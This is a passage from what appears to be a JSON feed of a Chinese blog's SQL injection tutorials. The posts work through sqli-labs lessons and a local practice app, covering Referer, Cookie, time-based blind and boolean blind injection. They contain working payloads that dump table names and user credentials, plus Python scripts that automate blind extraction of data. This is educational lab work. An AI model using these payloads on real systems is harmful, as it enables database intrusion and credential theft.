1</span><br></pre></td></tr></table></figure>\n<p><strong>依旧不行，我们回过头来看看第一个报错</strong></p>\n<p><code>near '&quot;', '127.0.0.1')' at line 1</code></p>\n<p><strong>去掉最外层的两个单引号：</strong></p>\n<p><code>&quot;', '127.0.0.1')</code></p>\n<p>一个数据库语句出现了逗号，说明极有可能是 union 引导的 <code>select 1,2 </code> 这样的查询，或者是<strong> insert、update</strong> 这样的语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">insert into 表名 values(a,b,c)</span><br><span class=\"line\">例子：insert into student_info values(5,&#x27;liutao&#x27;,&#x27;12&#x27;); </span><br><span class=\"line\"></span><br><span class=\"line\">UPDATE student_info SET num=4,name=&#x27;liutao&#x27;,age=&#x27;15&#x27;</span><br></pre></td></tr></table></figure>\n<p>因为除了逗号之外还出现了括号，<strong>update 和 select 一般是没有括号的</strong>，因此锁定在<strong> insert into</strong> 上。</p>\n<p>那么，我们目前注入的位置是很大概率在 <code>'liutao', '12'</code>  这个逗号所在位置附近。</p>\n<p>因此，<strong>由于注入内容后面跟着一个单引号</strong>，我们尝试 <code>and</code>  结合 <code>单引号</code> 注入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">insert into student_info values(5,&#x27;liutao&#x27; and &#x27;&#x27;,&#x27;12&#x27;); </span><br></pre></td></tr></table></figure>\n<p>OK，替换成我们的语句就是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; and &#x27;</span><br></pre></td></tr></table></figure>\n<p>成功不报错</p>\n<p><img src=\"image-20221002000657623.png\" alt=\"image-20221002000657623\"></p>\n<h2 id=\"优先尝试报错注入\"><a class=\"markdownIt-Anchor\" href=\"#优先尝试报错注入\">#</a> 优先尝试报错注入</h2>\n<p><strong>由于是使用 and + 单引号注入</strong>，可插入非法查询语句的位置和平常不太一样，因此我们尝试再加入 <code>一个and来构造一个报错条件</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; and extractvalue(1,concat(0x7e,version(),0x7e)) and &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002001021204.png\" alt=\"image-20221002001021204\"></p>\n<h2 id=\"爆数据库名\"><a class=\"markdownIt-Anchor\" href=\"#爆数据库名\">#</a> 爆数据库名</h2>\n<p>接下来就是替换 version () 了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) and &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002001434314.png\" alt=\"image-20221002001434314\"></p>\n<h2 id=\"爆表名\"><a class=\"markdownIt-Anchor\" href=\"#爆表名\">#</a> 爆表名</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002001605648.png\" alt=\"image-20221002001605648\"></p>\n<h2 id=\"爆列名\"><a class=\"markdownIt-Anchor\" href=\"#爆列名\">#</a> 爆列名</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x7e)) and &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002001714543.png\" alt=\"image-20221002001714543\"></p>\n<p>至此，HTTP-Referer 注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/Cookie%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/Cookie%E6%B3%A8%E5%85%A5/",
            "title": "Cookie注入",
            "date_published": "2022-10-01T14:13:13.000Z",
            "content_html": "<h1 id=\"sql注入之cookie注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入之cookie注入\">#</a> SQL 注入之 Cookie 注入</h1>\n<p>本篇讲解 Cookie 注入。</p>\n<p>老样子，Less-20，直接送入 repeater</p>\n<p><img src=\"image-20221001224019603.png\" alt=\"image-20221001224019603\"></p>\n<h2 id=\"尝试报错\"><a class=\"markdownIt-Anchor\" href=\"#尝试报错\">#</a> 尝试报错</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001224212276.png\" alt=\"image-20221001224212276\"></p>\n<h2 id=\"尝试不报错\"><a class=\"markdownIt-Anchor\" href=\"#尝试不报错\">#</a> 尝试不报错</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27; %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001224125843.png\" alt=\"image-20221001224125843\"></p>\n<h2 id=\"尝试order-by-注入\"><a class=\"markdownIt-Anchor\" href=\"#尝试order-by-注入\">#</a> 尝试 order by 注入</h2>\n<p>order by n asc/desc 是指定列号 n 进行排序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27; order by 4 %23</span><br><span class=\"line\">报错：YOUR COOKIE : uname = admin&#x27; order by 4 # and expires</span><br><span class=\"line\"></span><br><span class=\"line\">Cookie: uname=admin&#x27; order by 3 %23</span><br><span class=\"line\">成功不报错</span><br></pre></td></tr></table></figure>\n<p>因此确定 <code>列数为3</code></p>\n<p><code>注意</code> ：在 order by 后面的不会根据计算的结果来排序，所以可以直接用来报错注入。</p>\n<p>尝试下直接报错注入是否可行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27; order by extractvalue(1,concat(0x7e,version(),0x7e))%23</span><br><span class=\"line\">报错：YOUR COOKIE : uname = admin&#x27; order by extractvalue(1,concat(0x7e,version(),0x7e))#</span><br></pre></td></tr></table></figure>\n<p>报错，看来这种直接报错注入的方式是不可行的。</p>\n<h2 id=\"cookie注入查询到数据库名\"><a class=\"markdownIt-Anchor\" href=\"#cookie注入查询到数据库名\">#</a> Cookie 注入查询到数据库名</h2>\n<p>cookie 注入就是基于 union 查询的基础上，在 Cookie 中进行注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27; and 0 union select 1, database(), 3 %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001225129636.png\" alt=\"image-20221001225129636\"></p>\n<h2 id=\"查询到表名\"><a class=\"markdownIt-Anchor\" href=\"#查询到表名\">#</a> 查询到表名</h2>\n<p>进而通过替换 database () 处，变成 <code>双注入</code> ，再查询出表名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27; and 0 union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 3 %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001225840363.png\" alt=\"image-20221001225840363\"></p>\n<h2 id=\"查询到列名\"><a class=\"markdownIt-Anchor\" href=\"#查询到列名\">#</a> 查询到列名</h2>\n<p>一样的套路</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27; and 0 union select 1, (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;), 3 %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001230122246.png\" alt=\"image-20221001230122246\"></p>\n<h2 id=\"查询到账号密码\"><a class=\"markdownIt-Anchor\" href=\"#查询到账号密码\">#</a> 查询到账号密码</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27; and 0 union select 1, (select group_concat(concat_ws(0x7e,username,password)) from security.users), 3 %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001230318424.png\" alt=\"image-20221001230318424\"></p>\n<h2 id=\"思考\"><a class=\"markdownIt-Anchor\" href=\"#思考\">#</a> 思考</h2>\n<p>通过 Cookie 注入，我们要思考： <code>HTTP请求包中，是否还有其他的字段（Cookie外）也有可能和数据库产生交互呢？</code></p>\n<p>答：有的， <code>HTTP-Referer</code>  就存在。</p>\n<p>至此，Cookie 注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/",
            "url": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/",
            "title": "时间盲注",
            "date_published": "2022-10-01T12:10:06.000Z",
            "content_html": "<h1 id=\"sql注入之时间盲注\"><a class=\"markdownIt-Anchor\" href=\"#sql注入之时间盲注\">#</a> SQL 注入之时间盲注</h1>\n<p>在上一篇博客中，了解了<strong>布尔盲注</strong>，其实<strong>布尔盲注</strong>和<strong>时间盲注</strong>大致相同，注入原理是一致的，区别就是一个<strong>还是有回显的</strong>，一个<strong>彻底没有回显</strong>，通过构造语句，通过页面响应的时长，来判断信息，这就是时间盲注。</p>\n<p>先来学习一下<strong>时间盲注</strong>所需要的函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sleep()//延迟函数</span><br><span class=\"line\">if(condition,true,false)//若条件为真 返回true，若条件为假 返回false</span><br><span class=\"line\">substring(&quot;string&quot;,strart,length)</span><br></pre></td></tr></table></figure>\n<p>主要的也就是这几个了，下面就通过<strong> sqli-labs</strong> 第十关来练习时间盲注</p>\n<h2 id=\"尝试注入报错\"><a class=\"markdownIt-Anchor\" href=\"#尝试注入报错\">#</a> 尝试注入报错</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-10/?id=1&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001170904491.png\" alt=\"image-20221001170904491\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-10/?id=1&#x27;&quot;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001170453268.png\" alt=\"image-20221001170453268\"></p>\n<p>构造 <code>and 1</code>  条件，然后使用 if 条件语句包含时间盲注。</p>\n<p>如果 database () 的长度大于 5，那么返回 1，否则延迟 10s</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id=1&quot; and if(length(database())&gt;5,1,sleep(10))--+</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001175533536.png\" alt=\"image-20221001175533536\"></p>\n<p>将长度改为和 10 进行比较</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-10/?id=1&quot; and if(length(database())&gt;10,1,sleep(10))--+</span><br></pre></td></tr></table></figure>\n<p>开始转圈等待 10s 了，所以存在时间盲注条件。</p>\n<p><img src=\"image-20221001184209796.png\" alt=\"image-20221001184209796\"></p>\n<p>手工注入太浪费时间，开始研究脚本爆破</p>\n<h2 id=\"尝试脚本爆破\"><a class=\"markdownIt-Anchor\" href=\"#尝试脚本爆破\">#</a> 尝试脚本爆破</h2>\n<p><strong>时间盲注只需要这两个模块，一个获取时间，一个请求网址</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import time</span><br><span class=\"line\">import requests</span><br></pre></td></tr></table></figure>\n<p><strong>全局就定义了 1 个参数，数据库可能采用的字符</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">words = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-&#123;&#125;, &quot;</span><br></pre></td></tr></table></figure>\n<p><strong>判断 database () 长度的函数，也就是数据库名的长度，可以减少判断数据库名的时间，可以修改 length () 内部的参数来判断其他变量的长度，减少跑出名字的时间</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">words = <span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-&#123;&#125;, &quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_length</span>():</span><br><span class=\"line\">    length = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">15</span>):</span><br><span class=\"line\">        url = <span class=\"string\">&quot;http://127.0.0.1/sqli/Less-10/?id=1\\&quot; and if(length(database())=%d,sleep(2),0)&quot;</span> %(i)</span><br><span class=\"line\">        url = url+<span class=\"string\">&#x27;%23&#x27;</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(url)  <span class=\"comment\">#可输出测试是否写错</span></span><br><span class=\"line\">        start_time = time.time()<span class=\"comment\">#请求开始的时间</span></span><br><span class=\"line\">        requests.get(url)</span><br><span class=\"line\">        end_time = time.time()<span class=\"comment\">#请求结束的时间</span></span><br><span class=\"line\">        t = end_time - start_time<span class=\"comment\">#时间差</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> t &gt;= <span class=\"number\">1</span>:</span><br><span class=\"line\">            length = i</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;target_lenght is: &quot;</span>, length)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_name</span>():</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">10</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> words:</span><br><span class=\"line\">            <span class=\"comment\">#url = &quot;http://127.0.0.1/sqli/Less-10/?id=1\\&quot; and if(ascii(substr(select group_concat(table_name) from information_schema.tables where table_schema=database(),%d,1)=ord(&#x27;%s&#x27;)),sleep(1),0) --+&quot; %(i,j)</span></span><br><span class=\"line\">            url = <span class=\"string\">&quot;http://127.0.0.1/sqli/Less-10/?id=1\\&quot; and if(ascii(substr(database(),%d,1))=ord(&#x27;%s&#x27;),sleep(2),0) --+&quot;</span> %(i,j)</span><br><span class=\"line\">            url = url+<span class=\"string\">&#x27;%23&#x27;</span></span><br><span class=\"line\">            <span class=\"built_in\">print</span>(url)  <span class=\"comment\">#可输出测试是否写错</span></span><br><span class=\"line\">            start_time = time.time()<span class=\"comment\">#请求开始的时间</span></span><br><span class=\"line\">            requests.get(url)</span><br><span class=\"line\">            end_time = time.time()<span class=\"comment\">#请求结束的时间</span></span><br><span class=\"line\">            t = end_time - start_time<span class=\"comment\">#时间差</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> t &gt;= <span class=\"number\">1</span>:</span><br><span class=\"line\">                name += j</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;target_name is: &quot;</span>+ name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#target_length()</span></span><br><span class=\"line\">target_name()</span><br></pre></td></tr></table></figure>\n<p>可以得出，长度为 8，库名为<strong> security</strong></p>\n<p><img src=\"image-20221001200020143.png\" alt=\"image-20221001200020143\"></p>\n<p>接下来就改改 url 就可以爆破其他值了。</p>\n<p>通用 <code>GET类型时间盲注</code> 题目脚本小练习</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">key = <span class=\"string\">&#x27;Username: kevin&#x27;</span></span><br><span class=\"line\">words = <span class=\"string\">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-.&#123;&#125;&#x27;</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/SQLC/sql-2.php/SQl-4.php?id=1&#x27;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_length</span>():</span><br><span class=\"line\">\tlength = <span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">15</span>):</span><br><span class=\"line\">\t\tpayload = <span class=\"string\">&quot; and if(length(database())=&#123;&#125;,sleep(2),0) %23&quot;</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(url + payload)  <span class=\"comment\">#可输出测试是否写错</span></span><br><span class=\"line\">\t\tstart = time.time()</span><br><span class=\"line\">\t\trequests.get(url + payload)</span><br><span class=\"line\">\t\tend = time.time()</span><br><span class=\"line\">\t\tt = end - start</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> t &gt;=<span class=\"number\">1</span> :</span><br><span class=\"line\">\t\t\tlength = i</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;target_length is:&quot;</span>, <span class=\"built_in\">str</span>(length))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_name</span>(<span class=\"params\">length</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,length+<span class=\"number\">1</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> words:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot; and if(ascii(mid(database(),&#123;&#125;,1))=ord(&#x27;&#123;&#125;&#x27;),sleep(2),0) %23&quot;</span>.<span class=\"built_in\">format</span>(i,j)</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">print</span>(url + payload)</span><br><span class=\"line\">\t\t\tstart = time.time()</span><br><span class=\"line\">\t\t\trequests.get(url + payload)</span><br><span class=\"line\">\t\t\tend = time.time()</span><br><span class=\"line\">\t\t\tt = end - start</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> t &gt;=<span class=\"number\">1</span> :</span><br><span class=\"line\">\t\t\t\tname += j</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;target_name is:&quot;</span>, name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#target_length() #结果为target_length is: 9</span></span><br><span class=\"line\">target_name(<span class=\"number\">9</span>) <span class=\"comment\">#参数填入上一步的结果</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"C:%5CUsers%5CJcH4liXh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221001213601177.png\" alt=\"image-20221001213601177\"></p>\n<p>至此，时间盲注演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/",
            "url": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/",
            "title": "布尔盲注",
            "date_published": "2022-09-30T17:41:34.000Z",
            "content_html": "<h1 id=\"sql-注入之布尔盲注\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入之布尔盲注\">#</a> SQL 注入之布尔盲注</h1>\n<p>本篇使用布尔盲注。</p>\n<p><code>注意</code> ：盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施 SQL 注入。</p>\n<p><strong>布尔盲注</strong></p>\n<p><strong>原理：</strong><br>\n注入的时候只会返回 <code>True和False</code> ，所以布尔盲注就是根据页面显示的是 <code>True还是False</code>  进行猜测数据库中的信息。</p>\n<p>布尔盲注需要几个函数的辅助，就先来了解一下这几个函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">length()函数可返回字符串的长度</span><br><span class=\"line\">substring()函数可以截取字符串，可指定开始的位置和截取的长度</span><br><span class=\"line\">ord()函数可以返回单个字符的ASCII码</span><br><span class=\"line\">char()函数可将ASCII码转换为对应的字符</span><br></pre></td></tr></table></figure>\n<p>具体的用法可以参考大佬的博客<a href=\"https://www.jianshu.com/p/f0174ea6c69d\"> Mysql 语法介绍</a>，接下来就通过<strong> sql-labs</strong> 练习布尔盲注。</p>\n<p><strong>判断注入点</strong>（也就是闭合符号）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27;</span><br></pre></td></tr></table></figure>\n<p>发现输入 <code>id=1'</code>  没有错误回显</p>\n<p><img src=\"image-20221001005755289.png\" alt=\"image-20221001005755289\"></p>\n<p>在 <code>id=1'</code>  后再加上<strong>注释符号</strong>后又回显正确，所以判定闭合符号为 <code>'</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27; %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001005844512.png\" alt=\"image-20221001005844512\"></p>\n<p><strong>爆数据库长度</strong></p>\n<p>由于我们知道  <code>select uname = 'id' and 1 from xxxx</code>  在 id 有效的情况下，加入 <code>and 1</code>  不会影响整体判断</p>\n<p>那么，这里的 1 可以被任何的查询正确的 <code>布尔型判断语句</code> 返回结果所替代，比如 <code>length(database()) =x </code> 就可以来代替 1 这个值。</p>\n<p>只有当 x 等于正确的数据库长度时，才能使 <code>and 1 成立</code> ，才能使整个查询语句回显正确的内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and length(database())=1 --+</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and length(database())=2 --+</span><br><span class=\"line\">.....</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and length(database())=8 --+</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001010826646.png\" alt=\"image-20221001010826646\"></p>\n<p><img src=\"image-20221001010848025.png\" alt=\"image-20221001010848025\"></p>\n<p>手工注入的话就要一遍一遍的试试，将后面的长度不断增大，最后得出数据库名的长度为 <code>8</code></p>\n<p><strong>爆数据库名</strong><br>\n知道了数据库名的长度，接下来就来爆破数据库名</p>\n<p><strong>以这一句为基础</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27;and 1 --+</span><br></pre></td></tr></table></figure>\n<p>继续深入构造爆破查询语句：</p>\n<h3 id=\"注入步骤\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤\">#</a> 注入步骤</h3>\n<p>布尔盲注爆破数据库名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27;and ascii(substr(database(),1,1))=1 --+</span><br></pre></td></tr></table></figure>\n<p>然后交给<strong> BurpSuit</strong> 抓包，选择<strong> Send to Intruder</strong></p>\n<h4 id=\"清空变量\"><a class=\"markdownIt-Anchor\" href=\"#清空变量\">#</a> 清空变量</h4>\n<p><img src=\"image-20221001011237616.png\" alt=\"image-20221001011237616\"></p>\n<h4 id=\"设置爆破变量\"><a class=\"markdownIt-Anchor\" href=\"#设置爆破变量\">#</a> 设置爆破变量</h4>\n<p>首先我们确定好</p>\n<p>ascii(substr(database(), <code>1</code> ,1))= <code>1</code>  --+ 这一句中，我标识出来的两个位置【需要我们使用工具<strong>爆破</strong>】。</p>\n<p>使用 Add$ 来为想要爆破的变量添加上变量符号</p>\n<p><img src=\"image-20221001011541978.png\" alt=\"image-20221001011541978\"></p>\n<h4 id=\"选择爆破取值范围\"><a class=\"markdownIt-Anchor\" href=\"#选择爆破取值范围\">#</a> 选择爆破取值范围</h4>\n<p>第一个位置， ascii (substr (database (), <code>1</code> ,1))=1</p>\n<p><img src=\"image-20221001011859324.png\" alt=\"image-20221001011859324\"></p>\n<p>第二个位置， ascii (substr (database (),1,1))= <code>1</code></p>\n<p><img src=\"image-20221001012047075.png\" alt=\"image-20221001012047075\"></p>\n<h4 id=\"开始爆破\"><a class=\"markdownIt-Anchor\" href=\"#开始爆破\">#</a> 开始爆破</h4>\n<p><img src=\"image-20221001012115998.png\" alt=\"image-20221001012115998\"></p>\n<p>由于我们的包总长度 <code>根据回显内容不同而发生变化</code> ，因此，只有<strong>当取值正确的时候包长度会跟其他错误的情况不一样</strong>，看下图有 8 个情况和其他次数有不一样的结果。</p>\n<p><img src=\"image-20221001012215106.png\" alt=\"image-20221001012215106\"></p>\n<table>\n<thead>\n<tr>\n<th>payload1 (数据库名第 n 个字符)</th>\n<th>payload2 (数据库名第 n 个字符是什么字符)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>115–&gt;‘s’</td>\n</tr>\n<tr>\n<td>2</td>\n<td>101–&gt;‘e’</td>\n</tr>\n<tr>\n<td>3</td>\n<td>99  --&gt;‘c’</td>\n</tr>\n<tr>\n<td>4</td>\n<td>117–&gt;‘u’</td>\n</tr>\n<tr>\n<td>5</td>\n<td>114–&gt;‘r’</td>\n</tr>\n<tr>\n<td>6</td>\n<td>105–&gt;‘i’</td>\n</tr>\n<tr>\n<td>7</td>\n<td>116–&gt;‘t’</td>\n</tr>\n<tr>\n<td>8</td>\n<td>121–&gt;‘y’</td>\n</tr>\n</tbody>\n</table>\n<p>综上，数据库名是 <code>security</code></p>\n<p>爆破表名，同理</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=1 --+</span><br></pre></td></tr></table></figure>\n<p>小练习：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#尝试报错</span><br><span class=\"line\">①http://127.0.0.1/SQLC/sql-3.php/?id=1</span><br><span class=\"line\">②http://127.0.0.1/SQLC/sql-3.php/?id=1&#x27;</span><br><span class=\"line\">传入的值:id=1</span><br><span class=\"line\">SELECT * FROM users WHERE id=(1) LIMIT 0,1</span><br><span class=\"line\">Username: kevin</span><br><span class=\"line\">Password: Kevin</span><br><span class=\"line\"></span><br><span class=\"line\">id=1&#x27;查询失败</span><br><span class=\"line\"></span><br><span class=\"line\">#闭合符号，尝试不报错</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) %23</span><br><span class=\"line\">传入的值:id=1) #</span><br><span class=\"line\">SELECT * FROM users WHERE id=(1) #) LIMIT 0,1</span><br><span class=\"line\">Username: kevin</span><br><span class=\"line\">Password: Kevin</span><br><span class=\"line\"></span><br><span class=\"line\">#布尔盲注</span><br><span class=\"line\">#1.构造布尔值</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and 1 %23</span><br><span class=\"line\">Username: kevin</span><br><span class=\"line\">Password: Kevin</span><br><span class=\"line\"></span><br><span class=\"line\">#2.Burp爆破数据库长度</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and length(database())=9 %23</span><br><span class=\"line\"></span><br><span class=\"line\">#3.Burp爆破数据库名字</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr(database(),1,1))=20) %23</span><br><span class=\"line\">1-99</span><br><span class=\"line\">2-104</span><br><span class=\"line\">3-97</span><br><span class=\"line\">4-108</span><br><span class=\"line\">5-108</span><br><span class=\"line\">6-101</span><br><span class=\"line\">7-110</span><br><span class=\"line\">8-103</span><br><span class=\"line\">9-101</span><br><span class=\"line\">database()=challenge</span><br><span class=\"line\"></span><br><span class=\"line\">#4.爆破表名</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=20) %23</span><br><span 